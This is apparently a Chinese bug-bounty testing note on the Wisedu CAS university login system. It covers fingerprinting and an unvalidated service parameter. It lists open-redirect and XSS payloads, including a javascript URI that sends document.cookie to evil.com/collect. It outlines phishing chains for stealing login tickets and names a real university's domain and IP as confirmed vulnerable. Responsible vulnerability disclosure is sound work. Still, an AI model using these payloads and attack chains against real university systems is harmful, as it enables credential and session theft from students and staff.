# 金智教育CAS (wisedu) 测试模式

## 概述
金智教育(wisedu)是中国高校最常见的统一身份认证系统之一。CAS服务端基于Apereo CAS定制。
多所高校使用相同架构: authserver.{domain}/authserver/login

## 识别方法
```bash
# Server头
curl -sk 'https://authserver.{domain}/authserver/login' -I | grep Server
# 主题配置泄露
curl -sk 'https://authserver.{domain}/authserver/login' | grep -oE 'var theme = "[^"]*"'
# wisedu特征
curl -sk 'https://authserver.{domain}/authserver/login' | grep -E 'wisedu|_fidoEnabled|captchaSwitch|_badCredentialsCount'
```

## service参数注入 (CAS Open Redirect)

### 核心漏洞
service参数直接注入到页面JavaScript变量中，无白名单校验:
```bash
curl -sk 'https://authserver.{domain}/authserver/login?service=https://evil.com/' | grep 'var service'
# 返回: var service = "https://evil.com/";
```

### 测试向量 (按优先级)
```bash
# 1. 任意外部域名
?service=https://evil.com/collect

# 2. javascript:URI (注入到JS上下文)
?service=javascript:alert(document.cookie)

# 3. data:URI
?service=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# 4. 协议无关URL
?service=//evil.com/

# 5. 嵌套URL (绕过简单域名白名单)
?service=https://legit.school.edu.cn/callback?redirect=https://evil.com/

# 6. ftp://协议
?service=ftp://evil.com/
```

### 验证命令模板
```bash
# 替换IP和域名
curl -sk 'https://{IP}/authserver/login?service=https://evil.com/' -H 'Host: authserver.{domain}' | grep 'var service'
```

### DNS不可达时的访问方法
```bash
# 直接IP + Host头
curl -sk 'https://{IP}/authserver/login' -H 'Host: authserver.{domain}'
```

## 认证保护机制

| 特征 | 配置项 | 典型值 |
|------|--------|--------|
| 验证码 | captchaSwitch | 1 (启用) |
| 账号锁定 | _badCredentialsCount | 5 (5次后锁定) |
| FIDO | _fidoEnabled | true/false |
| REST API | /authserver/v1/tickets | 401 (需认证) |

## 指纹信息泄露
```bash
# 主题名 (含学校缩写+日期)
grep -oE 'var theme = "[^"]*"' 
# 格式: {学校缩写}_{YYYYMMDD}, 如 sus_20250410

# 锁定阈值
grep -oE '_badCredentialsCount=[0-9]+'

# 验证码开关
grep -oE 'captchaSwitch="[01]"'

# FIDO状态
grep -oE '_fidoEnabled="(true|false)"'
```

## 攻击链构建

### 链1: Open Redirect → 凭证窃取
1. 构造: `https://authserver.{domain}/authserver/login?service=https://evil.com/collect`
2. 社工发送给目标用户
3. 用户在官方CAS页面输入账号密码
4. CAS重定向到攻击者域名携带ticket
5. 攻击者用ticket登录所有CAS接入系统

### 链2: javascript:URI → 页面XSS
1. 构造: `https://authserver.{domain}/authserver/login?service=javascript:document.location='https://evil.com/collect?c='+document.cookie`
2. service值被注入到 `var service = "..."` 变量中
3. 需要验证页面JS是否会执行该service值 (浏览器渲染测试)

## SRC提交要点

**CAS Open Redirect属于URL跳转漏洞，SRC可能认为危害不足。提升通过率的方法:**
1. 必须展示完整攻击链: 从用户点击到凭证被窃取
2. 最好能演示javascript:URI的XSS效果
3. 说明影响范围: 全校师生+所有CAS接入系统
4. 提供修复建议: service参数白名单校验

**可能被拒的原因:**
- "URL跳转危害不足" — 需要证明能窃取凭证
- "需要用户交互" — 这是钓鱼类漏洞的固有特征
- "已有同类报告" — CAS wisedu在多个高校都存在相同问题

## 已测试的高校实例

| 学校 | 域名 | IP | 结果 |
|------|------|-----|------|
| 上海体育大学 | authserver.sus.edu.cn | 101.231.216.210 | 5个向量全部确认 |
